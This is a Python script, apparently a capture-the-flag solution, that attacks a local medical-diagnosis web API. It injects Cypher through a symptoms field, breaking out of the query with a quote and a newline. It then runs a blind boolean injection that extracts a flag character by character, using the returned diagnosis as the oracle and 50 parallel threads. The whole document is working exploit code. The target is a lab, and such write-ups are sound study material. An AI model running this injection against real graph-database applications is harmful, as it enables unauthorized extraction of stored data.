import requests, sys, random
from concurrent.futures import ThreadPoolExecutor
import string
import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

CHARS = string.digits + string.ascii_letters + '_-}'
TOTAL_CHARS = len(CHARS)
URL = 'http://127.0.0.1:3000'

def worker(ssn, known, c):
    r = requests.post(
        URL+"/api/setUser",
        json={"ssn":ssn,"fullname":"yeet","dateOfBirth":"11/11/1111","weight":"1"},
        proxies={
            'http':'http://127.0.0.1:8081',
            'https':'http://127.0.0.1:8081'
        },
        verify=False
    )

    r = requests.post(
        URL+"/api/setSymptoms",
        json={
            "ssn":ssn,
            "symptoms":[
                "Anxiety","Obsessions","Difficulty concentrating","Compulsions",
                "Fatigue']\u000aMATCH (f:Flag) WHERE f.flag STARTS WITH 'REPLACEME'//".replace(
                    'REPLACEME',
                    known+c
                )
            ]
        },
        proxies={
            'http':'http://127.0.0.1:8081',
            'https':'http://127.0.0.1:8081'
        },
        verify=False
    )

    r = requests.post(
        URL+"/api/getDiagnosis",
        json={
            "ssn": ssn
        },
        proxies={
            'http':'http://127.0.0.1:8081',
            'https':'http://127.0.0.1:8081'
        },
        verify=False
    )

    try:
        r_json = r.json()
        if r_json["message"][0]["name"] == "Obsessive-compulsive disorder (OCD)":
            return c
        return None
    except Exception as e:
        return None
    
def get_flag():
    known = "ctfzone{N0w"
    print(known, end='')
    sys.stdout.flush()

    while True:
        found = False
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(
                worker,
                [''.join(random.choices(string.ascii_letters+string.digits, k=9)) for _i in range(TOTAL_CHARS)],
                [known]*TOTAL_CHARS,
                CHARS
            )

            for r in results:
                if not r is None:
                    print(r, end='')
                    sys.stdout.flush()
                    known = known + r
                    found = True
                    break

        if not found:
            break

    print()


get_flag()
